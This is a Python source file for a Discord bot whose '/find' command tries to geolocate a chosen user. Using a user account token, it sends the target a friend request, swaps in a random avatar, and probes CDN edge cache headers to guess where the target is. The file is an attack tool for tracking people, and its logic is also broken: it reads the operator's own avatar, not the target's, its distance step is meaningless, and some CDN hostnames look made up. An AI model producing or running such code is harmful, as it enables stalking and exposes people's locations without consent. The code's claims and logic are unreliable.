import discord
import requests
import random
import io
from discord.ext import commands
from PIL import Image
import geopy.distance
import os

# Bot Setup
TOKEN = os.getenv("DISCORD_BOT_TOKEN")  # Store this in Railway env variables
USER_AUTH_TOKEN = os.getenv("DISCORD_USER_AUTH_TOKEN")  # Needs a real user token
CLOUDFLARE_EDGES = [
    "https://cdn.discordapp.com",
    "https://cdn-discordapp-com.global.ssl.fastly.net",
    "https://discordapp-cdn-xyz.cloudflare.com",
]

CLOUDFLARE_LOCATIONS = {
    "cdn.discordapp.com": (37.7749, -122.4194),  # San Francisco
    "cdn-discordapp-com.global.ssl.fastly.net": (52.5200, 13.4050),  # Berlin
    "discordapp-cdn-xyz.cloudflare.com": (35.6895, 139.6917),  # Tokyo
}

bot = commands.Bot(command_prefix="/", intents=discord.Intents.all())

# ==========================
# 🔹 Generate a Unique Avatar
# ==========================
def generate_random_avatar():
    size = (200, 200)
    img = Image.new("RGB", size)

    pixels = img.load()
    for x in range(size[0]):
        for y in range(size[1]):
            pixels[x, y] = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

    img_byte_array = io.BytesIO()
    img.save(img_byte_array, format="PNG")
    img_byte_array.seek(0)

    return img_byte_array

# ==========================
# 🔹 Upload Avatar to Discord
# ==========================
def upload_avatar():
    avatar_img = generate_random_avatar()
    files = {"avatar": ("avatar.png", avatar_img, "image/png")}
    
    headers = {"Authorization": USER_AUTH_TOKEN}
    url = "https://discord.com/api/v9/users/@me"

    response = requests.patch(url, headers=headers, files=files)

    if response.status_code == 200:
        print("✅ Avatar updated successfully!")
    else:
        print(f"❌ Error: {response.status_code} - {response.text}")

# ==========================
# 🔹 Send Friend Request
# ==========================
def send_friend_request(user_id):
    url = f"https://discord.com/api/v9/users/@me/relationships/{user_id}"
    headers = {
        "Authorization": USER_AUTH_TOKEN,
        "Content-Type": "application/json"
    }
    response = requests.put(url, headers=headers, json={})

    return response.status_code == 204

# ==========================
# 🔹 Get User Avatar Hash
# ==========================
def get_avatar_hash(username):
    url = f"https://discord.com/api/v9/users/@me"
    headers = {"Authorization": USER_AUTH_TOKEN}
    response = requests.get(url, headers=headers).json()

    user_id = response.get("id")
    avatar_hash = response.get("avatar")
    
    if user_id and avatar_hash:
        return user_id, avatar_hash
    return None, None

# ==========================
# 🔹 Check Cloudflare CDN Cache
# ==========================
def check_cache_status(user_id, avatar_hash):
    avatar_url = f"/avatars/{user_id}/{avatar_hash}.png"
    results = {}

    for edge in CLOUDFLARE_EDGES:
        try:
            response = requests.get(edge + avatar_url, headers={"Cache-Control": "no-cache"})
            cache_status = response.headers.get("Cf-Cache-Status", "UNKNOWN")
            results[edge] = cache_status
        except Exception as e:
            results[edge] = f"ERROR: {str(e)}"

    return results

# ==========================
# 🔹 Estimate User Location
# ==========================
def estimate_location(cache_results):
    closest_location = None
    min_distance = float("inf")

    for edge, cache_status in cache_results.items():
        if cache_status == "HIT":
            edge_location = CLOUDFLARE_LOCATIONS.get(edge)
            if edge_location:
                for known_location in CLOUDFLARE_LOCATIONS.values():
                    dist = geopy.distance.geodesic(edge_location, known_location).km
                    if dist < min_distance:
                        min_distance = dist
                        closest_location = edge_location

    return closest_location

# ==========================
# 🔹 Discord Bot Commands
# ==========================
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

@bot.command()
async def find(ctx, member: discord.Member):
    """ Finds approximate location of a user automatically """

    user_id = str(member.id)

    # Step 1: Send friend request
    if send_friend_request(user_id):
        await ctx.send(f"✅ Friend request sent to **{member.name}**.")
    else:
        await ctx.send(f"❌ Could not send friend request to **{member.name}**.")

    # Step 2: Generate & upload new avatar
    upload_avatar()
    await ctx.send("✅ Avatar updated.")

    # Step 3: Get avatar hash
    user_id, avatar_hash = get_avatar_hash(member.name)
    if not avatar_hash:
        await ctx.send("❌ Could not retrieve avatar hash.")
        return

    # Step 4: Check Cloudflare Cache
    cache_results = check_cache_status(user_id, avatar_hash)
    estimated_location = estimate_location(cache_results)

    if estimated_location:
        await ctx.send(f"🌍 **{member.name}** is likely near **{estimated_location}**.")
    else:
        await ctx.send("❌ Could not determine location.")

bot.run(TOKEN)
